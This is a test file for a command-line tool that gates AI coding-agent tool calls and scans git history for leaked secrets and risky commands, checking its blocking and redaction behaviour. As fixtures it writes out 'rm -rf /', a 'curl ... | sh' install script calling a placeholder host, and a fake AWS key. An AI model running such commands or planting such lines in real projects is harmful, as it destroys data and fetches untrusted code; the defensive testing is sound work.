/**
 * src/cli.test.ts — black-box CLI dispatch tests.
 * cli.ts self-dispatches on import (bundled-bin entry), so tests spawn it
 * via the current runtime instead of importing it.
 * Run: bun test src/cli.test.ts
 */
import { describe, it, expect, afterEach } from "bun:test";
import { execFileSync, execSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { installCodexAdapter } from "./adapters/codex";
import { installClaudeAdapter } from "./adapters/claude";
import { runPushCheck } from "./check";
import { buildExplainPrompt } from "./framework/explain";

const CLI_PATH = join(import.meta.dir, "cli.ts");

const created: string[] = [];
afterEach(() => {
  for (const d of created.splice(0)) rmSync(d, { recursive: true, force: true });
});

function runCli(args: string[], opts: { cwd?: string; input?: string; env?: Record<string, string> } = {}): { stdout: string; stderr: string; exit: number } {
  const cwd = opts.cwd ?? mkdtempSync(join(tmpdir(), "vf-cli-"));
  if (!opts.cwd) created.push(cwd);
  try {
    const stdout = execFileSync(process.execPath, [CLI_PATH, ...args], {
      cwd,
      input: opts.input,
      encoding: "utf-8",
      env: { ...process.env, ...opts.env },
      stdio: [opts.input === undefined ? "ignore" : "pipe", "pipe", "pipe"],
    });
    return { stdout, stderr: "", exit: 0 };
  } catch (e) {
    const err = e as { stdout?: string; stderr?: string; status?: number };
    return {
      stdout: String(err.stdout ?? ""),
      stderr: String(err.stderr ?? ""),
      exit: err.status ?? 1,
    };
  }
}

/** Scrubbed model keys: --explain tests must never make live calls, even on dev machines with keys set. */
const NO_KEYS = { MUSE_API_KEY: "", META_API_KEY: "" };

function gitEnv(): Record<string, string> {
  return { ...(process.env as Record<string, string>), GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_SYSTEM: "/dev/null" };
}

/** Fixture repo: clean base commit + leaky tip commit. Returns { root, base, tip }. */
function makePushRepo(): { root: string; base: string; tip: string } {
  const root = mkdtempSync(join(tmpdir(), "vf-push-"));
  created.push(root);
  const sh = (cmd: string): string => execSync(cmd, { cwd: root, env: gitEnv(), encoding: "utf-8" }).trim();
  sh("git init -q .");
  sh("git -c user.email=t@t -c user.name=t -c commit.gpgsign=false commit -q --allow-empty -m init");
  writeFileSync(join(root, "ok.ts"), "export const x = 1;\n", "utf-8");
  sh("git add -A");
  sh("git -c user.email=t@t -c user.name=t -c commit.gpgsign=false commit -qm base");
  const base = sh("git rev-parse HEAD");
  writeFileSync(join(root, "leak.tsx"), "const k = process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY;\n", "utf-8");
  sh("git add -A");
  sh("git -c user.email=t@t -c user.name=t -c commit.gpgsign=false commit -qm leaky");
  const tip = sh("git rev-parse HEAD");
  return { root, base, tip };
}

/**
 * Leak line for history fixtures. Built by concatenation so this test file
 * does not itself carry a public-prefix secret token for the project's own
 * self-scan; the committed fixture still contains the contiguous pattern.
 */
function leakLine(marker: string): string {
  return `const NEXT_PUBLIC_${"SECRET"} = "${marker}";\n`;
}

describe("cli --profile", () => {
  it("--profile muse selects the Claude adapter preset", () => {
    const r = runCli(["init", "--profile", "muse", "--dry-run"]);
    expect(r.exit).toBe(0);
    expect(r.stdout).toContain("would install adapters: claude");
  });

  it("--profile=muse equals form works", () => {
    const r = runCli(["init", "--profile=muse", "--dry-run"]);
    expect(r.exit).toBe(0);
    expect(r.stdout).toContain("would install adapters: claude");
  });

  it("explicit --adapters overrides --profile", () => {
    const r = runCli(["init", "--adapters=cursor", "--profile", "muse", "--dry-run"]);
    expect(r.exit).toBe(0);
    expect(r.stdout).toContain("would install adapters: cursor");
  });

  it("unknown --profile fails closed", () => {
    const r = runCli(["init", "--profile", "nope", "--dry-run"]);
    expect(r.exit).toBe(2);
    expect(r.stderr).toContain("unknown --profile");
  });

  it("tour stays an unadvertised stub (exit 2)", () => {
    const r = runCli(["tour"]);
    expect(r.exit).toBe(2);
    expect(r.stderr).toContain("not implemented");
  });

  it("--help documents --profile", () => {
    const r = runCli(["--help"]);
    expect(r.exit).toBe(0);
    expect(r.stdout).toContain("--profile=muse");
  });
});

describe("cli status", () => {
  it("does not claim installation automatically watches the next write", () => {
    const root = mkdtempSync(join(tmpdir(), "vf-init-status-"));
    created.push(root);
    const result = runCli(["init", "--adapters=codex"], { cwd: root, env: gitEnv() });
    expect(result.exit).toBe(0);
    expect(result.stdout).not.toContain("watches your next write");
    expect(result.stdout).toContain("status");
    expect(result.stdout).toContain("trust");
  });

  it("reports an advisory Codex adapter and an inactive redirected Git hook path", () => {
    const root = mkdtempSync(join(tmpdir(), "vf-status-"));
    created.push(root);
    execFileSync("git", ["init", "-q", root], { env: gitEnv() });
    execFileSync("git", ["config", "--local", "core.hooksPath", join(root, "missing-hooks")], { cwd: root, env: gitEnv() });
    const result = runCli(["status", "--host=codex", "--json"], { cwd: root, env: gitEnv() });
    expect(result.exit).toBe(0);
    const status = JSON.parse(result.stdout);
    expect(status.host).toBe("codex");
    expect(status.toolGate.state).toBe("advisory");
    expect(status.gitHooks.state).toBe("inactive");
    expect(status.gitHooks.path).toBe(join(root, "missing-hooks"));
  });

  it("does not treat a different matcher or modified hook script as configured protection", () => {
    const root = mkdtempSync(join(tmpdir(), "vf-status-hook-"));
    created.push(root);
    mkdirSync(join(root, ".codex/hooks"), { recursive: true });
    writeFileSync(join(root, ".codex/hooks/fence-gate.cjs"), "// user script");
    writeFileSync(join(root, ".codex/hooks.json"), JSON.stringify({ hooks: { PreToolUse: [{ matcher: "Read", hooks: [{ type: "command", command: 'node "$(git rev-parse --show-toplevel)/.codex/hooks/fence-gate.cjs"' }] }] } }));
    const result = runCli(["status", "--host=codex", "--json"], { cwd: root, env: { ...gitEnv(), FENCE_BIN: "/usr/bin/true" } });
    expect(result.exit).toBe(0);
    expect(JSON.parse(result.stdout).toolGate.state).toBe("degraded");
  });

  it("reports a configured Codex hook as degraded when the fence executable is missing", () => {
    const root = mkdtempSync(join(tmpdir(), "vf-status-bin-"));
    created.push(root);
    installCodexAdapter(root);
    const result = runCli(["status", "--host=codex", "--json"], { cwd: root, env: { ...gitEnv(), FENCE_BIN: join(root, "missing-fence") } });
    expect(result.exit).toBe(0);
    expect(JSON.parse(result.stdout).toolGate.state).toBe("degraded");
  });

  it("reports an unverified state when no host is selected", () => {
    const root = mkdtempSync(join(tmpdir(), "vf-status-unknown-"));
    created.push(root);
    const result = runCli(["status", "--json"], { cwd: root, env: gitEnv() });
    expect(result.exit).toBe(0);
    const status = JSON.parse(result.stdout);
    expect(status.host).toBe("unknown");
    expect(status.toolGate.state).toBe("unverified");
  });

  it("finds a configured Codex hook from a project subdirectory without claiming it is trusted", () => {
    const root = mkdtempSync(join(tmpdir(), "vf-status-subdir-"));
    created.push(root);
    execFileSync("git", ["init", "-q", root], { env: gitEnv() });
    installCodexAdapter(root);
    const nested = join(root, "src");
    mkdirSync(nested);
    const result = runCli(["status", "--host=codex", "--json"], { cwd: nested, env: { ...gitEnv(), FENCE_BIN: "/usr/bin/true" } });
    expect(result.exit).toBe(0);
    expect(JSON.parse(result.stdout).toolGate.state).toBe("configured-unverified");
  });

  it("reports a configured Codex hook as degraded when Node is unavailable on PATH", () => {
    const root = mkdtempSync(join(tmpdir(), "vf-status-node-"));
    created.push(root);
    installCodexAdapter(root);
    const emptyPath = join(root, "empty-path");
    mkdirSync(emptyPath);
    const result = runCli(["status", "--host=codex", "--json"], { cwd: root, env: { ...gitEnv(), FENCE_BIN: "/usr/bin/true", PATH: emptyPath } });
    expect(result.exit).toBe(0);
    expect(JSON.parse(result.stdout).toolGate.state).toBe("degraded");
  });
});

describe("cli status --host=claude", () => {
  it("reports an installed Claude hook as configured but not verified", () => {
    const root = mkdtempSync(join(tmpdir(), "vf-status-claude-"));
    created.push(root);
    installClaudeAdapter(root);
    const result = runCli(["status", "--host=claude", "--json"], { cwd: root, env: { ...gitEnv(), FENCE_BIN: "/usr/bin/true" } });
    expect(result.exit).toBe(0);
    const status = JSON.parse(result.stdout);
    expect(status.toolGate.state).toBe("configured-unverified");
    expect(status.jqExecutable).toBeTruthy();
  });

  it("reports Claude as advisory when no hook is installed", () => {
    const root = mkdtempSync(join(tmpdir(), "vf-status-claude-none-"));
    created.push(root);
    const result = runCli(["status", "--host=claude", "--json"], { cwd: root, env: gitEnv() });
    expect(result.exit).toBe(0);
    expect(JSON.parse(result.stdout).toolGate.state).toBe("advisory");
  });

  it("reports a present but modified Claude hook script as degraded", () => {
    const root = mkdtempSync(join(tmpdir(), "vf-status-claude-bad-"));
    created.push(root);
    installClaudeAdapter(root);
    writeFileSync(join(root, ".claude/hooks/fence-gate.sh"), "# user script\n");
    const result = runCli(["status", "--host=claude", "--json"], { cwd: root, env: { ...gitEnv(), FENCE_BIN: "/usr/bin/true" } });
    expect(result.exit).toBe(0);
    expect(JSON.parse(result.stdout).toolGate.state).toBe("degraded");
  });
});

describe("cli gate stdin", () => {
  it("checks tool arguments supplied on stdin without requiring them in command arguments", () => {
    const result = runCli(["gate", "--tool", "bash", "--args-stdin"], { input: JSON.stringify({ command: "rm -rf /" }) });
    expect(result.exit).toBe(1);
    expect(result.stdout).toContain("CMD-01");
  });
});

describe("cli check --push/--staged", () => {
  it("--push reads pre-push stdin (real hook protocol) and blocks leaky ranges", () => {
    const { root, base, tip } = makePushRepo();
    const input = `refs/heads/main ${tip} refs/heads/main ${base}\n`;
    const r = runCli(["check", "--push"], { cwd: root, input });
    expect(r.exit).toBe(1);
    expect(r.stdout).toContain("SEC-01");
  });

  it("--push with an explicit range scans without stdin", () => {
    const { root } = makePushRepo();
    const r = runCli(["check", "--push", "HEAD~1..HEAD"], { cwd: root });
    expect(r.exit).toBe(1);
    expect(r.stdout).toContain("SEC-01");
    const clean = runCli(["check", "--push", "HEAD~1"], { cwd: root });
    expect(clean.exit).toBe(0);
  });

  it("allows a deletion-only push without falling back to a missing upstream", () => {
    const { root, tip } = makePushRepo();
    const zeros = "0".repeat(40);
    const r = runCli(["check", "--push"], { cwd: root, input: `(delete) ${zeros} refs/heads/old ${tip}\n`, env: gitEnv() });
    expect(r.exit).toBe(0);
    expect(r.stdout).toContain("0 files");
  });

  it("manual --push without hook input falls back to upstream history", () => {
    const { root, base } = makePushRepo();
    const env = gitEnv();
    const branch = execFileSync("git", ["branch", "--show-current"], { cwd: root, env, encoding: "utf8" }).trim();
    execFileSync("git", ["remote", "add", "origin", "/tmp/fabricated-remote"], { cwd: root, env });
    execFileSync("git", ["update-ref", "refs/remotes/origin/main", base], { cwd: root, env });
    execFileSync("git", ["config", `branch.${branch}.remote`, "origin"], { cwd: root, env });
    execFileSync("git", ["config", `branch.${branch}.merge`, "refs/heads/main"], { cwd: root, env });
    const r = runCli(["check", "--push"], { cwd: root, input: "", env });
    expect(r.exit).toBe(1);
    expect(r.stdout).toContain("SEC-01");
  });

  it("rejects malformed pre-push lines even if another line is valid", () => {
    const { root, base, tip } = makePushRepo();
    const r = runCli(["check", "--push"], { cwd: root, input: `refs/heads/a ${base} refs/heads/a ${base}\nnot a valid git update\n`, env: gitEnv() });
    expect(r.exit).toBe(1);
    expect(r.stderr).toContain("malformed pre-push input");
    void tip;
  });

  it("does not reveal historical file content in human or JSON push reports", () => {
    const { root, base } = makePushRepo();
    const marker = "SENSITIVE_CANARY_QXZ_7391";
    const env = gitEnv();
    writeFileSync(join(root, "leak.tsx"), leakLine(marker));
    execFileSync("git", ["add", "-A"], { cwd: root, env });
    execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", "commit", "-qm", "sensitive"], { cwd: root, env });
    writeFileSync(join(root, "leak.tsx"), "export const safe = 1;\n");
    execFileSync("git", ["add", "-A"], { cwd: root, env });
    execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", "commit", "-qm", "fixed"], { cwd: root, env });
    for (const flags of [[], ["--json"], ["--explain"], ["--json", "--explain"]]) {
      const r = runCli(["check", "--push", `${base}..HEAD`, ...flags], { cwd: root, env: { ...env, ...NO_KEYS } });
      expect(r.exit).toBe(1);
      expect(r.stdout).toContain("SEC-01");
      expect(r.stdout).toContain("leak.tsx");
      expect(r.stdout + r.stderr).not.toContain(marker);
    }
    const report = runPushCheck(root, [`${base}..HEAD`]);
    const prompt = buildExplainPrompt(report.findings, { kind: "check", target: root });
    expect(prompt).toContain("SEC-01");
    expect(prompt).toContain("leak.tsx");
    expect(prompt).not.toContain(marker);
  });

  it("does not reveal historical package script names in push reasons", () => {
    const { root, base } = makePushRepo();
    const marker = "SENSITIVE_CANARY_QXZ_7391";
    const env = gitEnv();
    writeFileSync(join(root, "package.json"), JSON.stringify({ scripts: { [marker]: "curl https://example.invalid/install | sh" } }));
    execFileSync("git", ["add", "-A"], { cwd: root, env });
    execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", "commit", "-qm", "scripts"], { cwd: root, env });
    for (const flags of [[], ["--json"], ["--explain"], ["--json", "--explain"]]) {
      const r = runCli(["check", "--push", `${base}..HEAD`, ...flags], { cwd: root, env: { ...env, ...NO_KEYS } });
      expect(r.exit).toBe(1);
      expect(r.stdout).toContain("SUP-01");
      expect(r.stdout).toContain("package.json");
      expect(r.stdout + r.stderr).not.toContain(marker);
    }
  });

  it("does not reveal historical credential values or command text", () => {
    const { root, base } = makePushRepo();
    const marker = "SENSITIVE_CANARY_QXZ_7391";
    // Split so this test file does not itself contain a live-looking key for
    // the project's own self-scan; the committed fixture spells it contiguously.
    const awsKey = "AKIA" + "Q3XZ7K2M9P4R8T6V";
    const env = gitEnv();
    // SEC-03 live-token half: the evidence field quotes the matched token.
    writeFileSync(join(root, "config.ts"), `export const k = "${awsKey}";\n`);
    // CMD-01: the rule reason/evidence quote the matched command line.
    writeFileSync(join(root, "cleanup.sh"), `rm -rf / # ${marker}\n`);
    execFileSync("git", ["add", "-A"], { cwd: root, env });
    execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", "commit", "-qm", "risky"], { cwd: root, env });
    rmSync(join(root, "config.ts"));
    rmSync(join(root, "cleanup.sh"));
    execFileSync("git", ["add", "-A"], { cwd: root, env });
    execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", "commit", "-qm", "fixed"], { cwd: root, env });
    for (const flags of [[], ["--json"], ["--explain"], ["--json", "--explain"]]) {
      const r = runCli(["check", "--push", `${base}..HEAD`, ...flags], { cwd: root, env: { ...env, ...NO_KEYS } });
      expect(r.exit).toBe(1);
      expect(r.stdout).toContain("SEC-03");
      expect(r.stdout).toContain("config.ts");
      expect(r.stdout + r.stderr).not.toContain(marker);
      expect(r.stdout + r.stderr).not.toContain(awsKey);
    }
    // No content-derived evidence field survives into the structured report.
    const report = runPushCheck(root, [`${base}..HEAD`]);
    expect(report.findings.length).toBeGreaterThan(0);
    for (const f of report.findings) expect(f.evidence).toBeUndefined();
  });

  it("keeps live-tree evidence for staged scans (redaction is history-only)", () => {
    const { root } = makePushRepo();
    const marker = "SENSITIVE_CANARY_QXZ_7391";
    writeFileSync(join(root, "leak.tsx"), leakLine(marker));
    execFileSync("git", ["add", "-A"], { cwd: root, env: gitEnv() });
    const r = runCli(["check", "--staged", "--json"], { cwd: root, env: gitEnv() });
    expect(r.exit).toBe(1);
    const parsed = JSON.parse(r.stdout) as { findings: Array<{ ruleId: string; evidence?: string }> };
    const sec01 = parsed.findings.find((f) => f.ruleId === "SEC-01");
    // The staged blob is the user's own current work: showing it is the point of
    // the pre-commit gate. Only content replayed from old commits is redacted.
    expect(sec01?.evidence ?? "").toContain(marker);
  });

  it("--push rejects malformed explicit ranges", () => {
    const { root } = makePushRepo();
    const r = runCli(["check", "--push", "a..b..c"], { cwd: root });
    expect(r.exit).toBe(2);
    expect(r.stderr).toContain("bad --push range");
  });

  it("--staged and --push are mutually exclusive", () => {
    const r = runCli(["check", "--staged", "--push"]);
    expect(r.exit).toBe(2);
    expect(r.stderr).toContain("at most one");
  });
});

describe("cli --explain (no live calls — keys scrubbed)", () => {
  function makeProject(files: Record<string, string>): string {
    const root = mkdtempSync(join(tmpdir(), "vf-exp-"));
    created.push(root);
    for (const [rel, content] of Object.entries(files)) writeFileSync(join(root, rel), content, "utf-8");
    return root;
  }

  it("check --explain without a key notes and keeps the block exit", () => {
    const root = makeProject({ "a.ts": "const k = process.env.NEXT_PUBLIC_X_SECRET;\n" });
    const r = runCli(["check", "--explain"], { cwd: root, env: NO_KEYS });
    expect(r.exit).toBe(1);
    expect(r.stderr).toContain("--explain needs MUSE_API_KEY");
  });

  it("check --explain on a clean tree is a silent no-op", () => {
    const root = makeProject({ "a.ts": "export const x = 1;\n" });
    const r = runCli(["check", "--explain"], { cwd: root, env: NO_KEYS });
    expect(r.exit).toBe(0);
    expect(r.stderr).toBe("");
  });

  it("gate --explain without a key notes and keeps the block exit", () => {
    const root = makeProject({ "a.ts": "export const x = 1;\n" });
    const r = runCli(
      ["gate", "--tool", "write", "--args", JSON.stringify({ filePath: "a.ts", content: "const k = process.env.NEXT_PUBLIC_X_SECRET;" }), "--explain"],
      { cwd: root, env: NO_KEYS },
    );
    expect(r.exit).toBe(1);
    expect(r.stdout).toContain("SEC-01");
    expect(r.stderr).toContain("--explain needs MUSE_API_KEY");
  });

  it("gate --explain on an allowed call is a silent no-op", () => {
    const root = makeProject({ "a.ts": "export const x = 1;\n" });
    const r = runCli(["gate", "--tool", "write", "--args", JSON.stringify({ filePath: "a.ts", content: "export const x = 1;" }), "--explain"], {
      cwd: root,
      env: NO_KEYS,
    });
    expect(r.exit).toBe(0);
    expect(r.stderr).toBe("");
  });

  it("--help documents --explain", () => {
    const r = runCli(["--help"]);
    expect(r.stdout).toContain("--explain");
  });
});
